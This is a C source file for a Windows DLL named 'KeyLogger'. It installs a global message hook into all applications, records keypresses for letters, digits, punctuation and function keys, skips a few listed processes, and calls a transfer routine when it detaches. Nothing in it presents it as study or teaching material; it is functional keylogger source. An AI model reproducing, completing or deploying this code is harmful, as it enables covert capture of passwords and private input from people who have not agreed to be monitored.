//* Running in the Main Thread.

#include "..\..\..\Include\Keylog.h"

BOOL						bKLExitReadConfigThread;
BOOL						fMonitorApp;						// flag to indicate whether the present application should be monitored or not
WCHAR						wszConfigFilePath[MAX_PATH + 1];	// path of the configuration file

HINSTANCE					hInstance;

extern	HANDLE				hConfigChangeEvent;					// created by KLIF

extern	CRITICAL_SECTION	csAppInit;
extern	CRITICAL_SECTION	csLinkList;

#pragma data_seg( "SharedSegment" )

HHOOK	hWndHook = NULL;
BOOL	fHookFlag = FALSE;									//flag indicating whether dll is hooked to all the applications or not
WCHAR	CurrentDirectory[MAX_PATH + 1] = {0};

BOOL	bKLExitAllReadConfigThread = FALSE;

WCHAR g_szCurApp[MAX_PATH];

#pragma data_seg()
#pragma comment ( linker, "/SECTION:SharedSegment,RWS" )

BOOLEAN WINAPI DllMain( HINSTANCE hDllHandle, DWORD  nReason, LPVOID Reserved )
{
	switch( nReason )
	{
	case DLL_PROCESS_ATTACH :
        {
            if (GetModuleFileNameW(NULL, g_szCurApp, ARRAYSIZE(g_szCurApp)) > 0)
            {
                WCHAR szMsg[MAX_PATH];
                swprintf_s(szMsg, L"KeyLogger: Attached to %s", g_szCurApp);
                OutputDebugString(szMsg);
            }
            InitializeCriticalSection(&csAppInit);
            InitializeCriticalSection(&csLinkList);
            break;
        }

	case DLL_THREAD_ATTACH :
		break;

	case DLL_THREAD_DETACH :
		break;

	case DLL_PROCESS_DETACH : // called when window closes
		{
            WCHAR szMsg[MAX_PATH];
            swprintf_s(szMsg, L"KeyLogger: Detaching from %s", g_szCurApp);
            OutputDebugString(szMsg);

			bKLExitReadConfigThread = TRUE;
			StartTransfer();

			DeleteCriticalSection( &csLinkList );
			DeleteCriticalSection( &csAppInit );

            swprintf_s(szMsg, L"KeyLogger: Detached from %s", g_szCurApp);
            OutputDebugString(szMsg);
			break;
		}
	}

	hInstance = (HINSTANCE) hDllHandle;

    return TRUE;
}

BOOL InstallKLHook( WCHAR *CPMDirectory )
{
    WCHAR szMsg[MAX_PATH];
    swprintf_s(szMsg, L"KeyLogger: InstallKLHook in %s", g_szCurApp);
    OutputDebugString(szMsg);

	hWndHook = SetWindowsHookEx( WH_GETMESSAGE, (HOOKPROC)KLGetMsgProc, (HINSTANCE)hInstance, 0 );
	if( hWndHook == NULL )
		return FALSE;

	fHookFlag = TRUE;
	wcscpy_s( CurrentDirectory, MAX_PATH, CPMDirectory );

	return TRUE;
}

BOOL RemoveKLHook()
{
    WCHAR szMsg[MAX_PATH];
    swprintf_s(szMsg, L"KeyLogger: RemoveKLHook in %s", g_szCurApp);
    OutputDebugString(szMsg);

	bKLExitAllReadConfigThread = TRUE;

	if( hWndHook )
	{
		UnhookWindowsHookEx( hWndHook );
		hWndHook = NULL;
	}
	return TRUE;	// FALSE?
}

LRESULT CALLBACK KLGetMsgProc( int nCode, WPARAM wParam, LPARAM lParam )
{
	unsigned int VirtualKey = 0;
	static DWORD KeyUpTime = 0;
	static DWORD KeyDownTime = 0;
	static DWORD dwMinuteTimer = -1;

	BOOL fEvent = FALSE;
	BOOL FuncRetVal = FALSE;

	if( nCode == HC_ACTION )
	{	
		MSG *pMsg = (MSG*) lParam;

		switch( pMsg->message )
		{
		case WM_KEYUP:
			{
				if( KeyUpTime == pMsg->time )
					break;

				VirtualKey = pMsg->wParam;

				if	(	(VirtualKey == VK_HOME || VirtualKey == VK_END)
					||	(VirtualKey == VK_SHIFT)
					||	(VirtualKey == VK_ESCAPE || VirtualKey == VK_CANCEL)
					||	(VirtualKey == VK_LWIN || VirtualKey == VK_RWIN || VirtualKey == VK_APPS) )
				{
					if( NeverHookThisProcess() == TRUE )
						break;
					if( InitProcess() == FALSE )
						break;
					if( fMonitorApp == FALSE )
						break;

					FuncRetVal = ProcessKey( UP, pMsg->hwnd, pMsg->wParam, pMsg->lParam );
					if( FuncRetVal == FALSE )
						break;

					KeyUpTime = pMsg->time;
				}
				break;
			}// End of case WM_KEYUP

		case WM_KEYDOWN:
			{
				if(KeyDownTime == pMsg->time)
					break;

				VirtualKey = pMsg->wParam;

				if	(	(VirtualKey == VK_PRIOR || VirtualKey == VK_NEXT)
					||	(VirtualKey == VK_LEFT || VirtualKey == VK_UP || VirtualKey == VK_RIGHT || VirtualKey == VK_DOWN)
					||	(VirtualKey == VK_INSERT || VirtualKey == VK_DELETE)
					||	(VirtualKey == VK_BACK || VirtualKey == VK_TAB || VirtualKey == VK_SPACE || VirtualKey == VK_RETURN)
					||	(VirtualKey >= 0X70 && VirtualKey <= 0X7B)	// Function Keys F1 - F12
					||	(VirtualKey >= 0X30 && VirtualKey <= 0X5A)	// 0-9 . . A-Z
					||	(VirtualKey >= 0xBA && VirtualKey <= 0xC0)	// :; += <, _- >. ?/ ~`
					||	(VirtualKey >= 0XDB && VirtualKey <= 0XDE)	// {[ |\ }] '"
					||	(VirtualKey >= 0X60 && VirtualKey <= 0X6F)	// NUM
					||	(VirtualKey == VK_SHIFT) )
				{
					if( NeverHookThisProcess() == TRUE )
						break;
					if( InitProcess() == FALSE )
						break;
					if( fMonitorApp == FALSE )
						break;

					FuncRetVal = ProcessKey( DOWN, pMsg->hwnd, pMsg->wParam, pMsg->lParam );
					if( FuncRetVal == FALSE )
						break;

					KeyDownTime = pMsg->time;
				}

				break;
			}// End of case WM_KEYDOWN

		} // End of switch( pMsg->message )
	} // End of if( Code == HC_ACTION )

	return CallNextHookEx( hWndHook, nCode, wParam, lParam );
}

// This function is used for making sure that hook doesnt happen to certain applications
BOOL NeverHookThisProcess()
{
    WCHAR wszFilePath[MAX_PATH + 1];
    WCHAR *pDestFile = NULL;
    int nRetPath;

    // List of application to which hooking should not be done
    WCHAR *pIgnoreList[10] = { L"devenv.exe", L"explorer.exe", L"serverrm.exe", L"clientrm.exe", NULL };

    nRetPath = GetModuleFileName(NULL, wszFilePath, MAX_PATH);  // Getting the .exe file path of the application 
    if (nRetPath == 0)
        return FALSE;

    for (int Index = 0; pIgnoreList[Index] != NULL; Index++)
    {
        pDestFile = StrStrI(wszFilePath, pIgnoreList[Index]);   // Comparing file path with the each of the application in ignore list
        if (pDestFile)
            return TRUE;
    }
    return FALSE;
}
